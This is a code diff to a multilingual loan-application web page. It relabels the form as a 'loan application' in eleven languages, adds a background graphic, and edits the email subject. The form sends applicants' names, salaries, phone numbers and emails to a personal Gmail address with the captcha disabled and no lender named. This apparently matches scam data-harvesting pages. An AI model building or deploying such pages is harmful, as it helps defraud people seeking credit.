@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Votre demande</title>
+<title>Demande de crédit</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;800&display=swap" rel="stylesheet">
@@ -54,6 +54,11 @@ button[disabled]{opacity:.6;cursor:wait}
 .msg.ok{display:block;background:color-mix(in srgb,var(--ok) 14%,transparent);color:var(--ok)}
 .msg.err{display:block;background:color-mix(in srgb,var(--err) 14%,transparent);color:var(--err)}
 .note{font-size:.82rem;color:var(--muted);margin-top:1rem}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:linear-gradient(rgba(6,32,34,.55),rgba(6,32,34,.78)),
+    url("fond.jpg") center/cover no-repeat,
+    url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 1200' preserveAspectRatio='xMidYMid slice'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='1'><stop offset='0' stop-color='%230F5C5A'/><stop offset='1' stop-color='%23091F24'/></linearGradient></defs><rect width='800' height='1200' fill='url(%23g)'/><g fill='%23ffffff' fill-opacity='.07'><rect x='60' y='820' width='90' height='300'/><rect x='190' y='720' width='90' height='400'/><rect x='320' y='610' width='90' height='510'/><rect x='450' y='490' width='90' height='630'/><rect x='580' y='360' width='90' height='760'/></g><g fill='none' stroke='%23F2C14E' stroke-opacity='.35' stroke-width='6'><circle cx='640' cy='170' r='70'/><circle cx='640' cy='170' r='48'/><circle cx='520' cy='250' r='56'/><circle cx='520' cy='250' r='36'/><circle cx='150' cy='330' r='80'/><circle cx='150' cy='330' r='56'/></g><path d='M40 1000 L200 880 L330 930 L470 720 L620 650 L760 480' fill='none' stroke='%23F2C14E' stroke-opacity='.55' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/></svg>") center/cover no-repeat,#0B2E30}
+h1{color:#fff;text-shadow:0 2px 14px rgba(0,0,0,.45)}
 [dir="rtl"] .top{justify-content:flex-start}
 </style>
 </head>
@@ -122,18 +127,18 @@ button[disabled]{opacity:.6;cursor:wait}
 const DESTINATION_EMAIL = "lapatience195@gmail.com";
 const KEYS = "langLabel|title|montant|salaire|nom|prenom|pays|ville|job|tel|email|choose|btn|sending|ok|err|invalid".split("|");
 const T = {
-  fr:"Langue|Votre demande|Montant dont vous avez besoin|Salaire mensuel|Nom de famille|Prénom|Pays|Ville|Profession|Numéro de téléphone|Adresse email|Choisir un pays|Envoyer ma demande|Envoi en cours…|Merci ! Votre demande a bien été envoyée.|L’envoi a échoué. Vérifiez votre connexion et réessayez.|Veuillez remplir tous les champs correctement.",
-  en:"Language|Your request|Amount you need|Monthly salary|Last name|First name|Country|City|Occupation|Phone number|Email address|Select a country|Send my request|Sending…|Thank you! Your request has been sent.|Sending failed. Check your connection and try again.|Please fill in all fields correctly.",
-  lt:"Kalba|Jūsų prašymas|Jums reikalinga suma|Mėnesinis atlyginimas|Pavardė|Vardas|Šalis|Miestas|Profesija|Telefono numeris|El. pašto adresas|Pasirinkite šalį|Siųsti prašymą|Siunčiama…|Ačiū! Jūsų prašymas išsiųstas.|Nepavyko išsiųsti. Patikrinkite ryšį ir bandykite dar kartą.|Teisingai užpildykite visus laukus.",
-  lb:"Sprooch|Är Ufro|Betrag deen Dir braucht|Monatsgehalt|Familljennumm|Virnumm|Land|Stad|Beruff|Telefonsnummer|E-Mail-Adress|Wielt e Land|Meng Ufro schécken|Gëtt geschéckt…|Merci! Är Ufro gouf geschéckt.|Schécke feelgeschloen. Kontrolléiert Är Verbindung a probéiert nach eng Kéier.|Fëllt w.e.g. all Felder richteg aus.",
-  lv:"Valoda|Jūsu pieprasījums|Nepieciešamā summa|Mēneša alga|Uzvārds|Vārds|Valsts|Pilsēta|Profesija|Tālruņa numurs|E-pasta adrese|Izvēlieties valsti|Nosūtīt pieprasījumu|Sūta…|Paldies! Jūsu pieprasījums ir nosūtīts.|Nosūtīšana neizdevās. Pārbaudiet savienojumu un mēģiniet vēlreiz.|Lūdzu, pareizi aizpildiet visus laukus.",
-  it:"Lingua|La tua richiesta|Importo di cui hai bisogno|Stipendio mensile|Cognome|Nome|Paese|Città|Professione|Numero di telefono|Indirizzo email|Scegli un paese|Invia la mia richiesta|Invio in corso…|Grazie! La tua richiesta è stata inviata.|Invio non riuscito. Controlla la connessione e riprova.|Compila correttamente tutti i campi.",
-  de:"Sprache|Ihre Anfrage|Benötigter Betrag|Monatsgehalt|Nachname|Vorname|Land|Stadt|Beruf|Telefonnummer|E-Mail-Adresse|Land auswählen|Meine Anfrage senden|Wird gesendet…|Danke! Ihre Anfrage wurde gesendet.|Senden fehlgeschlagen. Prüfen Sie Ihre Verbindung und versuchen Sie es erneut.|Bitte füllen Sie alle Felder korrekt aus.",
-  pt:"Idioma|O seu pedido|Montante de que precisa|Salário mensal|Apelido|Nome|País|Cidade|Profissão|Número de telefone|Endereço de email|Escolha um país|Enviar o meu pedido|A enviar…|Obrigado! O seu pedido foi enviado.|Falha no envio. Verifique a ligação e tente novamente.|Preencha todos os campos corretamente.",
-  ru:"Язык|Ваша заявка|Необходимая сумма|Ежемесячная зарплата|Фамилия|Имя|Страна|Город|Профессия|Номер телефона|Адрес электронной почты|Выберите страну|Отправить заявку|Отправка…|Спасибо! Ваша заявка отправлена.|Не удалось отправить. Проверьте соединение и повторите попытку.|Пожалуйста, правильно заполните все поля.",
-  uk:"Мова|Ваша заявка|Потрібна сума|Щомісячна зарплата|Прізвище|Ім’я|Країна|Місто|Професія|Номер телефону|Адреса електронної пошти|Оберіть країну|Надіслати заявку|Надсилання…|Дякуємо! Вашу заявку надіслано.|Не вдалося надіслати. Перевірте з’єднання та спробуйте ще раз.|Будь ласка, правильно заповніть усі поля.",
-  ro:"Limba|Cererea dvs.|Suma de care aveți nevoie|Salariu lunar|Nume de familie|Prenume|Țara|Orașul|Profesia|Număr de telefon|Adresă de email|Alegeți o țară|Trimite cererea|Se trimite…|Mulțumim! Cererea dvs. a fost trimisă.|Trimiterea a eșuat. Verificați conexiunea și încercați din nou.|Completați corect toate câmpurile.",
-  hr:"Jezik|Vaš zahtjev|Iznos koji trebate|Mjesečna plaća|Prezime|Ime|Država|Grad|Zanimanje|Broj telefona|Adresa e-pošte|Odaberite državu|Pošalji zahtjev|Slanje…|Hvala! Vaš zahtjev je poslan.|Slanje nije uspjelo. Provjerite vezu i pokušajte ponovno.|Molimo ispravno ispunite sve polja."
+  fr:"Langue|Demande de crédit|Montant dont vous avez besoin|Salaire mensuel|Nom de famille|Prénom|Pays|Ville|Profession|Numéro de téléphone|Adresse email|Choisir un pays|Envoyer ma demande|Envoi en cours…|Merci ! Votre demande a bien été envoyée.|L’envoi a échoué. Vérifiez votre connexion et réessayez.|Veuillez remplir tous les champs correctement.",
+  en:"Language|Loan application|Amount you need|Monthly salary|Last name|First name|Country|City|Occupation|Phone number|Email address|Select a country|Send my request|Sending…|Thank you! Your request has been sent.|Sending failed. Check your connection and try again.|Please fill in all fields correctly.",
+  lt:"Kalba|Paskolos prašymas|Jums reikalinga suma|Mėnesinis atlyginimas|Pavardė|Vardas|Šalis|Miestas|Profesija|Telefono numeris|El. pašto adresas|Pasirinkite šalį|Siųsti prašymą|Siunčiama…|Ačiū! Jūsų prašymas išsiųstas.|Nepavyko išsiųsti. Patikrinkite ryšį ir bandykite dar kartą.|Teisingai užpildykite visus laukus.",
+  lb:"Sprooch|Kreditsufro|Betrag deen Dir braucht|Monatsgehalt|Familljennumm|Virnumm|Land|Stad|Beruff|Telefonsnummer|E-Mail-Adress|Wielt e Land|Meng Ufro schécken|Gëtt geschéckt…|Merci! Är Ufro gouf geschéckt.|Schécke feelgeschloen. Kontrolléiert Är Verbindung a probéiert nach eng Kéier.|Fëllt w.e.g. all Felder richteg aus.",
+  lv:"Valoda|Kredīta pieprasījums|Nepieciešamā summa|Mēneša alga|Uzvārds|Vārds|Valsts|Pilsēta|Profesija|Tālruņa numurs|E-pasta adrese|Izvēlieties valsti|Nosūtīt pieprasījumu|Sūta…|Paldies! Jūsu pieprasījums ir nosūtīts.|Nosūtīšana neizdevās. Pārbaudiet savienojumu un mēģiniet vēlreiz.|Lūdzu, pareizi aizpildiet visus laukus.",
+  it:"Lingua|Richiesta di prestito|Importo di cui hai bisogno|Stipendio mensile|Cognome|Nome|Paese|Città|Professione|Numero di telefono|Indirizzo email|Scegli un paese|Invia la mia richiesta|Invio in corso…|Grazie! La tua richiesta è stata inviata.|Invio non riuscito. Controlla la connessione e riprova.|Compila correttamente tutti i campi.",
+  de:"Sprache|Kreditantrag|Benötigter Betrag|Monatsgehalt|Nachname|Vorname|Land|Stadt|Beruf|Telefonnummer|E-Mail-Adresse|Land auswählen|Meine Anfrage senden|Wird gesendet…|Danke! Ihre Anfrage wurde gesendet.|Senden fehlgeschlagen. Prüfen Sie Ihre Verbindung und versuchen Sie es erneut.|Bitte füllen Sie alle Felder korrekt aus.",
+  pt:"Idioma|Pedido de crédito|Montante de que precisa|Salário mensal|Apelido|Nome|País|Cidade|Profissão|Número de telefone|Endereço de email|Escolha um país|Enviar o meu pedido|A enviar…|Obrigado! O seu pedido foi enviado.|Falha no envio. Verifique a ligação e tente novamente.|Preencha todos os campos corretamente.",
+  ru:"Язык|Заявка на кредит|Необходимая сумма|Ежемесячная зарплата|Фамилия|Имя|Страна|Город|Профессия|Номер телефона|Адрес электронной почты|Выберите страну|Отправить заявку|Отправка…|Спасибо! Ваша заявка отправлена.|Не удалось отправить. Проверьте соединение и повторите попытку.|Пожалуйста, правильно заполните все поля.",
+  uk:"Мова|Заявка на кредит|Потрібна сума|Щомісячна зарплата|Прізвище|Ім’я|Країна|Місто|Професія|Номер телефону|Адреса електронної пошти|Оберіть країну|Надіслати заявку|Надсилання…|Дякуємо! Вашу заявку надіслано.|Не вдалося надіслати. Перевірте з’єднання та спробуйте ще раз.|Будь ласка, правильно заповніть усі поля.",
+  ro:"Limba|Cerere de credit|Suma de care aveți nevoie|Salariu lunar|Nume de familie|Prenume|Țara|Orașul|Profesia|Număr de telefon|Adresă de email|Alegeți o țară|Trimite cererea|Se trimite…|Mulțumim! Cererea dvs. a fost trimisă.|Trimiterea a eșuat. Verificați conexiunea și încercați din nou.|Completați corect toate câmpurile.",
+  hr:"Jezik|Zahtjev za kredit|Iznos koji trebate|Mjesečna plaća|Prezime|Ime|Država|Grad|Zanimanje|Broj telefona|Adresa e-pošte|Odaberite državu|Pošalji zahtjev|Slanje…|Hvala! Vaš zahtjev je poslan.|Slanje nije uspjelo. Provjerite vezu i pokušajte ponovno.|Molimo ispravno ispunite sve polja."
 };
 for(const l in T) T[l] = Object.fromEntries(T[l].split("|").map((v,i)=>[KEYS[i],v]));
 
@@ -212,7 +217,7 @@ $("form").addEventListener("submit", async e=>{
     "Téléphone": "+"+dial+" "+$("tel").value.trim(),
     "Email": $("email").value.trim(),
     "Langue du visiteur": lang,
-    "_subject": "Nouvelle demande : "+$("prenom").value.trim()+" "+$("nom").value.trim(),
+    "_subject": "Nouvelle demande de crédit : "+$("prenom").value.trim()+" "+$("nom").value.trim(),
     "_template": "table",
     "_captcha": "false",
     "_honey": document.querySelector("[name=_honey]").value
